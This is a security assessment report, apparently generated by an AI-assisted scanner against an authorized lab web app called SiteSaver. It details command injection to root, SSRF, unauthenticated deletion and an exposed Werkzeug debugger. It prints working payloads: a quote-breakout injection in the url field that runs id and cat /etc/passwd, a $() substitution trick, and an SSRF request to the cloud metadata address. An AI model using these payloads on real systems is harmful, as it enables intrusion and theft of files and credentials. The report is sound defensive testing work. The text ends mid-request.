# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce OS command injection = RCE as root via URL validator (curl shell) at POST /add_url `url`](#finding-1)
    - [2. HIGH — idor-write Unauthenticated Deletion of Arbitrary URLs — No Ownership or Auth Check](#finding-2)
    - [3. HIGH — ssrf Server-Side Request Forgery (SSRF) via URL submission](#finding-3)
    - [4. HIGH — misconfig Flask/Werkzeug debug mode enabled in production — interactive debugger + source/secret disclosure](#finding-4)
    - [5. MEDIUM — workflow-bypass Validation bypass: unreachable/arbitrary URLs persisted to the "validated" list (POST /add_url -> GET /)](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr2utguz-s98qwi` |
| Target | http://target.local:5094/ |
| Started | 2026-07-02T01:57:09.134Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:5094`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 1 critical, 3 high, 1 medium

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] OS command injection = RCE as root via URL validator (curl shell) at POST /add_url `url`

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5094/

The SiteSaver URL-validation flow concatenates the user-supplied `url` POST field into an OS shell command of the form `curl ... "<url>"` (executed via a shell) and then REFLECTS the command's stdout into the JSON response ("URL status was checked and returned <stdout> status, Saved successfully!"). A double-quote breakout (`http://example.com"; <command> #`) therefore yields full, output-based OS command execution as root. Proven impact: injecting `; id` returns uid=0(root) gid=0(root) groups=0(root); injecting `; cat /etc/passwd` returns the full /etc/passwd (root:x:0:0:root:/root:/bin/bash...); injecting `; pwd; ls -la` reveals CWD /app and the app source (app.py, Dockerfile, flag.txt [0 bytes in this instance], templates/). The process runs as root, so this is complete host compromise (arbitrary file read/write, code execution, lateral movement). Also confirmed independently via a host-substitution oracle: url=http://$(echo${IFS}example).org/ resolves (shell evaluates $()) to example.org => "Saved", while url=http://$(echo${IFS}<bogus>).org/ => "Error". Note: OOB/Collaborator channels do NOT fire (the server has no egress to arbitrary external hosts and blocks loopback/private targets); exploitation and confirmation are fully in-band via the reflected stdout. Distinct from the already-recorded SSRF on the same param (that is outbound request forgery; this is code execution as root).

**Reproduction**

```
1. POST /add_url, Content-Type application/x-www-form-urlencoded, body: url=http%3A%2F%2Fexample.com%22%3B%20id%20%23  (decodes to http://example.com"; id #). Response message: "...returned 200uid=0(root) gid=0(root) groups=0(root) status, Saved successfully!" (ev-mr2wj4ai-31).
2. Arbitrary file read: body url=http%3A%2F%2Fexample.com%22%3B%20cat%20%2Fetc%2Fpasswd%20%23 => response message contains the full /etc/passwd (root:x:0:0:...). Reproduced twice: ev-mr2wj5k2-32, ev-mr2wkuhg-34.
3. Negative control: a benign submit returns just "...returned 200 status, Saved successfully!" with no command output (ev-mr2wj6rj-33).
Mechanism: `curl -w "%{http_code}" ... "<url>"` in a shell; the `"; <cmd> #` breakout runs <cmd> whose stdout is appended to the reflected http_code. effectMarker `root:x:0:0` appears only when the injected `cat /etc/passwd` executes.
```

**Evidence**

- Evidence `ev-mr2wj6rj-33` — `artifacts/_/ev-mr2wj6rj-33/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

url=http%3A%2F%2Fexample.com%22%3B%20cat%20flag.txt%20%23
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 125
content-type: application/json
date: Thu, 02 Jul 2026 02:45:08 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "message": "URL status was checked and returned 200 status, Saved successfully!",
  "redirect": "/",
  "success": true
}
```

- Evidence `ev-mr2wj5k2-32` — `artifacts/_/ev-mr2wj5k2-32/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

url=http%3A%2F%2Fexample.com%22%3B%20cat%20%2Fetc%2Fpasswd%20%23
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1068
content-type: application/json
date: Thu, 02 Jul 2026 02:45:06 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "message": "URL status was checked and returned 200root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin status, Saved successfully!",
  "redirect": "/",
  "success": true
}
```

- Evidence `ev-mr2wkuhg-34` — `artifacts/_/ev-mr2wkuhg-34/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

url=http%3A%2F%2Fexample.com%22%3B%20cat%20%2Fetc%2Fpasswd%20%23
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1068
content-type: application/json
date: Thu, 02 Jul 2026 02:46:25 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "message": "URL status was checked and returned 200root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin status, Saved successfully!",
  "redirect": "/",
  "success": true
}
```

<a id="finding-2"></a>

### 2. [HIGH] [idor-write] Unauthenticated Deletion of Arbitrary URLs — No Ownership or Auth Check

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5094/

POST /delete_url/{id} requires no authentication and performs no ownership check. An anonymous HTTP client can delete any URL record by guessing or enumerating its integer ID. The server returns 302 with a "URL deleted successfully!" flash for any valid ID, regardless of whether the requester created or owns the record. A non-existent ID (9999) returns 404, proving the 302 responses reflect real deletions rather than a catch-all. Any visitor — or a cross-site attacker using CSRF — can wipe the entire URL list.

**Reproduction**

```
1. Load / and read the ID values from the delete form action attributes (e.g. /delete_url/2, /delete_url/4).
2. Send `POST http://target.local:5094/delete_url/2` with empty Cookie and Authorization headers.
3. Observe HTTP 302 → / with flash "URL deleted successfully!" — the record is gone.
4. Repeat for another ID (e.g. 4) — same outcome, confirming repeatability.
Negative control: POST /delete_url/9999 (non-existent) → 404.
```

**Evidence**

- Evidence `ev-mr2v0mdu-h` — `artifacts/s-0001/ev-mr2v0mdu-h/`

Request:

```http
POST /delete_url/9999 HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:02:42 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mr2uzsir-f` — `artifacts/s-0001/ev-mr2uzsir-f/`

Request:

```http
POST /delete_url/2 HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 189
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:02:03 GMT
location: /
server: Werkzeug/3.0.3 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

- Evidence `ev-mr2v0mzo-i` — `artifacts/s-0001/ev-mr2v0mzo-i/`

Request:

```http
POST /delete_url/4 HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 189
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:02:43 GMT
location: /
server: Werkzeug/3.0.3 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

<a id="finding-3"></a>

### 3. [HIGH] [ssrf] Server-Side Request Forgery (SSRF) via URL submission

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5094/

The /add_url endpoint accepts a `url` body parameter and makes a server-side HTTP request to it ("Our service sends requests to the URLs you provide to ensure they are valid"). Submitting internal network addresses causes the server to fetch them. Self-SSRF to http://target.local:5094/ returned "URL status was checked and returned 200 status, Saved successfully!" — the server successfully fetched its own internal address. A request to http://169.254.169.254/ (AWS IMDS) caused a ~20s timeout (AbortError), confirming the server attempted to reach the cloud metadata endpoint. No authentication required.

**Reproduction**

```
1. GET /add_url — returns the HTML form (no server-side fetch).
2. POST /add_url with url=http://target.local:5094/ → {"success":true,"message":"URL status was checked and returned 200 status, Saved successfully!"} — server fetched the internal address.
3. POST /add_url with url=http://target.local:5094/ a second time — stable result confirms SSRF.
4. POST /add_url with url=http://169.254.169.254/latest/meta-data/ — observe ~20s timeout confirming the server attempted AWS IMDS.
```

**Evidence**

- Evidence `ev-mr2vho83-1v` — `artifacts/s-0002/ev-mr2vho83-1v/`

Request:

```http
GET /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 2406
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:15:58 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <title>Add Site</title>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">SiteSaver</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link active" aria-current="page" href="/add_url">Add Site</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/">View Saved Sites</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
<div class="container mt-4">
    <h1>Add Site Url</h1>
    
    

    <form method="POST"   class="mb-3">
        <div class="mb-3">
            <label for="url" class="form-label">URL</label>
            <input type="text" class="form-control" id="url" name="url" placeholder="Enter URL here" required>
        </div>
        <button type="submit" class="btn btn-primary">Submit</button>
    </form>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script> 
    // form submit 
    $('form').submit(function(e) {
        e.preventDefault();
        var url = $('#url').val();
        $.ajax({
            url: '/add_url',
            type: 'POST',
            data: {url: url},
            success: function(response) {
                alert(response.message);
                if (response.success == true) {
                    window.location.href = response.redirect;
                    
                }  
            }
        });
        
    });
</script>
</body>
</html>
```

- Evidence `ev-mr2vfqxj-1t` — `artifacts/s-0002/ev-mr2vfqxj-1t/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

url=http://target.local:5094/
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 125
content-type: application/json
date: Thu, 02 Jul 2026 02:14:28 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "message": "URL status was checked and returned 200 status, Saved successfully!",
  "redirect": "/",
  "success": true
}
```

- Evidence `ev-mr2vg4ld-1u` — `artifacts/s-0002/ev-mr2vg4ld-1u/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

url=http://target.local:5094/
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 125
content-type: application/json
date: Thu, 02 Jul 2026 02:14:45 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "message": "URL status was checked and returned 200 status, Saved successfully!",
  "redirect": "/",
  "success": true
}
```

<a id="finding-4"></a>

### 4. [HIGH] [misconfig] Flask/Werkzeug debug mode enabled in production — interactive debugger + source/secret disclosure

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5094/

The application runs Flask with debug mode / the Werkzeug interactive debugger enabled in production. Any unhandled exception returns a full interactive traceback page instead of a generic 500. This discloses: server-side source code snippets, absolute filesystem paths (/usr/local/lib/python3.8/site-packages/flask/app.py), the Python version (3.8) and framework internals, and — critically — the Werkzeug debugger console SECRET value `SECRET = "***REDACTED***"` embedded in the page. The interactive console (EVALEX) allows arbitrary Python execution on the server when unlocked with the debugger PIN; the PIN is derived from host/user/machine data that is itself partly leaked via such tracebacks, so an exposed debugger is a well-known path to full RCE. Even absent console access, the traceback/source/secret disclosure is a serious information leak that aids further exploitation. Triggered trivially, e.g. POST /add_url with the `url` form field omitted raises werkzeug.exceptions.BadRequestKeyError and renders the debugger. Remediation: run with debug=False (never use the Werkzeug debugger in production) and a WSGI server.

**Reproduction**

```
1. POST /add_url with Content-Type application/x-www-form-urlencoded and an EMPTY body (the `url` field missing). Response: HTTP 500, ~15KB HTML titled "werkzeug.exceptions.BadRequestKeyError ... Werkzeug Debugger" containing a full traceback, source snippets, file paths, and inline `SECRET = "***REDACTED***"`.
2. Negative control: POST /add_url with body url=http://example.org/ => HTTP 200 JSON, no debugger.
Marker "Werkzeug Debugger" appears only in the 500 responses (2 stable replays). Evidence: negativeControl ev-mr2wa4j5-2u; positiveReplays ev-mr2wa4re-2v, ev-mr2wa4zu-2w.
```

**Evidence**

- Evidence `ev-mr2wa4j5-2u` — `artifacts/_/ev-mr2wa4j5-2u/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

url=http://example.org/
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 125
content-type: application/json
date: Thu, 02 Jul 2026 02:38:05 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "message": "URL status was checked and returned 200 status, Saved successfully!",
  "redirect": "/",
  "success": true
}
```

- Evidence `ev-mr2wa4re-2v` — `artifacts/_/ev-mr2wa4re-2v/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
```

Response:

```http
HTTP/1.1 500
connection: close
content-length: 15055
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:38:05 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
  <head>
    <title>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = false,
          EVALEX_TRUSTED = false,
          SECRET = "***REDACTED***";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>BadRequestKeyError</h1>
<div class="detail">
  <p class="errormsg">werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-131185661388048">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1498</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
</div>

<li><div class="frame" id="frame-131185661388160">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1476</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-131185661388496">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1473</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-131185661388384">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">882</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-131185661388272">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">880</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-131185661388720">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">865</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-131185661387152">
  <h4>File <cite class="filename">"/app/app.py"</cite>,
      line <em class="line">28</em>,
      in <code class="function">add_url</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span>@app.route(&#39;/add_url&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</pre>
<pre class="line before"><span class="ws"></span>def add_url():</pre>
<pre class="line before"><span class="ws">    </span>if request.method == &#39;POST&#39;:</pre>
<pre class="line current"><span class="ws">        </span>url = request.form[&#39;url&#39;]</pre>
<pre class="line after"><span class="ws">        </span>response = check_url(url)</pre>
<pre class="line after"><span class="ws">        </span>print(response)</pre>
<pre class="line after"><span class="ws">        </span>if &#39;200&#39; in response:</pre>
<pre class="line after"><span class="ws">            </span>new_url = URL(url=url)</pre>
<pre class="line after"><span class="ws">            </span>db.session.add(new_url)</pre></div>
</div>

<li><div class="frame" id="frame-131185661388832">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py"</cite>,
      line <em class="line">196</em>,
      in <code class="function">__getitem__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>if key in self:</pre>
<pre class="line before"><span class="ws">            </span>lst = dict.__getitem__(self, key)</pre>
<pre class="line before"><span class="ws">            </span>if len(lst) &gt; 0:</pre>
<pre class="line before"><span class="ws">                </span>return lst[0]</pre>
<pre class="line current"><span class="ws">        </span>raise exceptions.BadRequestKeyError(key)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def __setitem__(self, key, value):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Like :meth:`add` but removes an existing key first.</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>:param key: the key for the value.</pre></div>
</div>
</ul>
  <blockquote>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1476, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File &#34;/app/app.py&#34;, line 28, in add_url
    url = request.form[&#39;url&#39;]
  File &#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&#34;, line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1476, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/app/app.py", line 28, in add_url
    url = request.form['url']
  File "/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py", line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: 'url'


-->
```

- Evidence `ev-mr2wa4zu-2w` — `artifacts/_/ev-mr2wa4zu-2w/`

Request:

```http
POST /add_url HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
